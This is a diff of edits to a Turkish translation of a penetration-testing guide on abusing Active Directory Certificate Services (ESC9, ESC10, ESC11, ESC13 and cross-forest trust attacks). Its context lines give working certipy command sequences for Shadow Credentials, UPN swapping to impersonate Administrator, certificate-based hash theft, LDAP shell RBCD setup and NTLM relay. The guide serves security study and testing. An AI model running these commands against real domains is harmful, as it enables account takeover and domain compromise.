-NTLM relay saldırılarının bir diğer sınırlaması, **bir saldırgan kontrolündeki makinenin bir kurban hesabı tarafından kimlik doğrulanması gerektiğidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamayı **zorlamaya** çalışabilir:
+NTLM relay saldırılarının bir diğer sınırlaması, **bir saldırgan kontrolündeki makinenin bir kurban hesabı tarafından kimlik doğrulaması yapılması gerektiğidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamasını **zorlamaya** çalışabilir:
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
@@ -384,7 +380,7 @@ execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <
 ```
 #### Abuse with [Certipy](https://github.com/ly4k/Certipy)
 
-Certipy, varsayılan olarak, `$` ile bitip bitmediğine bağlı olarak `Machine` veya `User` şablonuna dayalı olarak bir sertifika talep eder. Alternatif bir şablonun belirtilmesi `-template` parametresi kullanılarak gerçekleştirilebilir.
+Certipy, varsayılan olarak, `Machine` veya `User` şablonuna dayalı olarak bir sertifika talep eder; bu, iletilen hesap adının `$` ile bitip bitmediğine bağlıdır. Alternatif bir şablonun belirtilmesi, `-template` parametresinin kullanılmasıyla sağlanabilir.
 
 Daha sonra kimlik doğrulamasını zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Alan denetleyicileri ile çalışırken, `-template DomainController` belirtilmesi gereklidir.
 ```bash
@@ -403,7 +399,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 ### Açıklama
 
-Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılır, bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` (varsayılan ayar) olarak ayarlandığında önem kazanır; bu, `2` ayarı ile çelişir. ESC9'un yokluğu, gereksinimleri değiştirmeyeceğinden, Kerberos veya Schannel için daha zayıf bir sertifika eşlemesinin istismar edilebileceği senaryoların önemini artırır (ESC10'da olduğu gibi).
+Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılır, bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` (varsayılan ayar) olarak ayarlandığında önem kazanır; bu, `2` ayarıyla çelişir. ESC9'un yokluğu, gereksinimleri değiştirmeyeceğinden, Kerberos veya Schannel için daha zayıf bir sertifika eşlemesinin istismar edilebileceği senaryoların önemini artırır (ESC10'da olduğu gibi).
 
 Bu bayrağın ayarının önemli hale geldiği koşullar şunlardır:
 
@@ -416,7 +412,7 @@ Bu bayrağın ayarının önemli hale geldiği koşullar şunlardır:
 
 Diyelim ki `John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip ve amacı `Administrator@corp.local`'ı tehlikeye atmaktır. `Jane@corp.local`'ın kaydolmasına izin verilen `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile yapılandırılmıştır.
 
-İlk olarak, `Jane`'in hash'i, `John`'un `GenericWrite`'ı sayesinde Shadow Credentials kullanılarak elde edilir:
+İlk olarak, `Jane`'in hash'i, `John`'ın `GenericWrite`'ı sayesinde Shadow Credentials kullanılarak elde edilir:
 ```bash
 certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 ```
@@ -424,9 +420,9 @@ Sonrasında, `Jane`'in `userPrincipalName` değeri `Administrator` olarak deği�
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-Bu değişiklik, `Administrator@corp.local`'ın `Administrator`'ın `userPrincipalName`'i olarak farklı kalması göz önüne alındığında kısıtlamaları ihlal etmez.
+Bu değişiklik, `Administrator@corp.local`'ın `Administrator`'ın `userPrincipalName` olarak farklı kalması göz önüne alındığında kısıtlamaları ihlal etmez.
 
-Bunun ardından, savunmasız olarak işaretlenmiş `ESC9` sertifika şablonu `Jane` olarak talep edilir:
+Bunun ardından, zayıf olarak işaretlenmiş `ESC9` sertifika şablonu `Jane` olarak talep edilir:
 ```bash
 certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
 ```
@@ -436,7 +432,7 @@ Sertifikanın `userPrincipalName`'inin `Administrator` olarak yansıdığı ve h
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Verilen sertifika ile kimlik doğrulama denemesi artık `Administrator@corp.local` NT hash'ini veriyor. Sertifikanın alan belirtimi eksik olduğundan, komut `-domain <domain>` içermelidir:
+Verilen sertifika ile kimlik doğrulama denemesi artık `Administrator@corp.local` NT hash'ini veriyor. Komut, sertifikanın alan belirtimi eksikliği nedeniyle `-domain <domain>` içermelidir:
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
@@ -444,7 +440,7 @@ certipy auth -pfx adminitrator.pfx -domain corp.local
 
 ### Açıklama
 
-Alan denetleyicisinde iki kayıt defteri anahtar değeri ESC10 tarafından belirtilmiştir:
+ESC10, etki alanı denetleyicisindeki iki kayıt defteri anahtar değerine atıfta bulunur:
 
 - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), daha önce `0x1F` olarak ayarlanmıştı.
 - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, daha önce `0` idi.
@@ -457,13 +453,13 @@ Alan denetleyicisinde iki kayıt defteri anahtar değeri ESC10 tarafından belir
 
 Eğer `CertificateMappingMethods` `UPN` bitini (`0x4`) içeriyorsa.
 
-### Suistimal Durumu 1
+### Kötüye Kullanım Durumu 1
 
 `StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını tehlikeye atmak için kullanılabilir.
 
-Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip bir saldırgan, `Administrator@corp.local` hesabını tehlikeye atmayı hedefler. Prosedür ESC9'u yansıtır ve herhangi bir sertifika şablonunun kullanılmasına izin verir.
+Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir saldırgan, `Administrator@corp.local` hesabını tehlikeye atmayı hedefler. Prosedür, herhangi bir sertifika şablonunun kullanılmasına izin veren ESC9 ile aynıdır.
 
-İlk olarak, `Jane`'in hash'i Shadow Credentials kullanılarak, `GenericWrite`'ı istismar ederek elde edilir.
+İlk olarak, `Jane`'in hash'i, `GenericWrite`'ı kullanarak Shadow Credentials ile elde edilir.
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
@@ -499,7 +495,7 @@ certipy account update -username John@corp.local -password Passw0rd! -user Jane 
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-`Jane`'in `userPrincipalName` bu işlemden sonra orijinal haline geri döner.
+`Jane`'in `userPrincipalName`'i bu işlemden sonra orijinal haline döner.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
@@ -507,11 +503,11 @@ Schannel üzerinden kimlik doğrulamak için, Certipy'nin `-ldap-shell` seçene�
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-LDAP shell üzerinden, `set_rbcd` gibi komutlar Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) saldırılarını etkinleştirir ve bu da etki alanı denetleyicisini tehlikeye atabilir.
+LDAP shell üzerinden, `set_rbcd` gibi komutlar, Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) saldırılarına olanak tanır ve bu durum etki alanı denetleyicisini tehlikeye atabilir.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-Bu zafiyet, `userPrincipalName` eksik olan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabını da kapsar; varsayılan `Administrator@corp.local`, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName` eksikliği nedeniyle önemli bir hedef olmaktadır.
+Bu zafiyet, `userPrincipalName`'ı olmayan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabını da kapsar; varsayılan `Administrator@corp.local`, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName`'ın olmaması nedeniyle önemli bir hedef olmaktadır.
 
 ## NTLM'yi ICPR'ye İletme - ESC11
 
@@ -519,7 +515,7 @@ Bu zafiyet, `userPrincipalName` eksik olan veya `sAMAccountName` ile eşleşmeye
 
 Eğer CA Sunucusu `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC hizmeti aracılığıyla imzalamadan NTLM iletme saldırıları gerçekleştirilebilir. [Burada referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) bulunmaktadır.
 
-`Enforce Encryption for Requests` devre dışı bırakıldığında, `certipy` kullanarak durumu belirleyebilirsiniz ve certipy `ESC11` Zafiyetlerini gösterecektir.
+`Enforce Encryption for Requests` devre dışı ise, `certipy` kullanarak durumu belirleyebilirsiniz ve certipy `ESC11` Zafiyetlerini gösterecektir.
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -557,7 +553,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-Not: Alan denetleyicileri için DomainController'da `-template` belirtmeliyiz. 
+Not: Alan denetleyicileri için, DomainController'da `-template` belirtmeliyiz. 
 
 Veya [sploutchy'nin impacket çatallamasını](https://github.com/sploutchy/impacket) kullanarak:
 ```bash
@@ -623,27 +619,21 @@ OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 
 Bir kullanıcı izni bulun, `certipy find` veya `Certify.exe find /showAllPermissions` kullanabilir.
 
-Eğer `John` `VulnerableTemplate`'i kaydetme iznine sahipse, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını miras alabilir.
+Eğer `John`, `VulnerableTemplate` için kaydolma iznine sahipse, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını miras alabilir.
 
-Tek yapması gereken şablonu belirtmek, OIDToGroupLink haklarına sahip bir sertifika alacaktır.
+Tek yapması gereken şablonu belirtmek, OIDToGroupLink haklarıyla bir sertifika alacaktır.
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
-## Sertifikalarla Ormanların Ele Geçirilmesi Pasif Sesle Açıklandı
+## Sertifikalar ile Ormanların Ele Geçirilmesi Pasif Sesle Açıklandı
 
-### Ele Geçirilmiş CA'lar Tarafından Orman Güvenlerinin İhlali
+### Ele Geçirilmiş CA'lar Tarafından Orman Güvenlerinin Kırılması
 
-**Çapraz orman kaydı** için yapılandırma nispeten basittir. **Kaynak ormandan gelen kök CA sertifikası**, yöneticiler tarafından **hesap ormanlarına yayımlanır** ve kaynak ormandan gelen **kurumsal CA** sertifikaları, her hesap ormanındaki `NTAuthCertificates` ve AIA konteynerlerine **eklenir**. Bu düzenleme, **kaynak ormandaki CA'ya**, yönettiği PKI için tüm diğer ormanlar üzerinde tam kontrol sağlar. Eğer bu CA **saldırganlar tarafından ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikalar **sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı ihlal edilmiş olur.
+**Çapraz orman kaydı** için yapılandırma oldukça basittir. **Kaynak ormanın kök CA sertifikası**, yöneticiler tarafından **hesap ormanlarına yayımlanır** ve **kaynak ormandan gelen kurumsal CA** sertifikaları, her hesap ormanındaki `NTAuthCertificates` ve AIA konteynerlerine **eklenir**. Bu düzenleme, **kaynak ormandaki CA'nın**, yönettiği PKI için tüm diğer ormanlar üzerinde tam kontrol sahibi olmasını sağlar. Eğer bu CA **saldırganlar tarafından ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikalar **sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı kırılmış olur.
 
 ### Yabancı Prensiplere Verilen Kayıt Ayrıcalıkları
 
-Çoklu orman ortamlarında, **sertifika şablonları yayımlayan Kurumsal CA'lar** konusunda dikkatli olunmalıdır; bu şablonlar **Kimlik Doğrulanmış Kullanıcılar veya yabancı prensipler** (Kurumsal CA'nın ait olduğu ormana dışarıdan kullanıcılar/gruplar) için **kayıt ve düzenleme hakları** sağlar.\
-Bir güven ilişkisi üzerinden kimlik doğrulama yapıldığında, **Kimlik Doğrulanmış Kullanıcı SID**'si AD tarafından kullanıcının token'ına eklenir. Dolayısıyla, bir alan, **Kimlik Doğrulanmış Kullanıcıların kayıt haklarına izin veren** bir Kurumsal CA'ya sahipse, bir **farklı ormandan bir kullanıcı tarafından bir şablon kaydedilebilir**. Benzer şekilde, eğer **bir şablon tarafından bir yabancı prense açıkça kayıt hakları verilirse**, **çapraz orman erişim kontrol ilişkisi oluşturulur**, bu da bir ormandan bir prensibin **başka bir ormandan bir şablona kaydolmasına** olanak tanır.
+Çoklu orman ortamlarında, **sertifika şablonları yayımlayan** Kurumsal CA'lar konusunda dikkatli olunmalıdır; bu şablonlar **Kimlik Doğrulanmış Kullanıcılar veya yabancı prensiplerin** (Kurumsal CA'nın ait olduğu ormanın dışındaki kullanıcılar/gruplar) **kayıt ve düzenleme haklarına** izin verir.\
+Bir güven ilişkisi üzerinden kimlik doğrulama yapıldığında, **Kimlik Doğrulanmış Kullanıcılar SID**'si AD tarafından kullanıcının token'ına eklenir. Dolayısıyla, bir alan, **Kimlik Doğrulanmış Kullanıcılar kayıt haklarına** sahip bir Kurumsal CA'ya sahipse, farklı bir ormandan bir kullanıcı tarafından **bir şablon kaydedilebilir**. Benzer şekilde, eğer **bir şablon tarafından bir yabancı prense açıkça kayıt hakları verilirse**, **çapraz orman erişim kontrol ilişkisi oluşturulur**, bu da bir ormandan bir prensibin **başka bir ormandan bir şablona kaydolmasına** olanak tanır.
 
 Her iki senaryo da bir ormandan diğerine **saldırı yüzeyinin artmasına** yol açar. Sertifika şablonunun ayarları, bir saldırgan tarafından yabancı bir alanda ek ayrıcalıklar elde etmek için istismar edilebilir.
-
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
-
-{{#include ../../../banners/hacktricks-training.md}}
